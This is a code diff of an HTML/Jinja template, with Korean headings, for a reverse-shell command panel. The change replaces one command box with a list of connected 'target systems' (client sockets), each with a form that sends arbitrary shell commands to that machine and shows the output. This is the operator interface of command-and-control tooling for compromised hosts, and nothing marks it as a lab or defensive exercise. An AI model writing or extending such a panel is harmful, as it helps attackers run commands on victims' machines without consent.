@@ -9,10 +9,19 @@
 </head>
 <body>
     <h1>리버스 쉘 명령어 실행</h1>
-    <form action="/execute" method="post">
-        <textarea name="command" rows="4" cols="50" placeholder="명령어를 입력하세요..."></textarea><br>
-        <button type="submit">명령어 실행</button>
-    </form>
+    
+    <h3>타겟 시스템 목록</h3>
+    <ul>
+        {% for target_id, client_socket in targets.items() %}
+        <li>{{ target_id }} 
+            <form action="/execute" method="post" style="display:inline;">
+                <input type="hidden" name="target_id" value="{{ target_id }}">
+                <input type="text" name="command" placeholder="명령어를 입력하세요" required>
+                <button type="submit">실행</button>
+            </form>
+        </li>
+        {% endfor %}
+    </ul>
 
     <h3>실행 결과</h3>
     <pre>{{ result }}</pre>
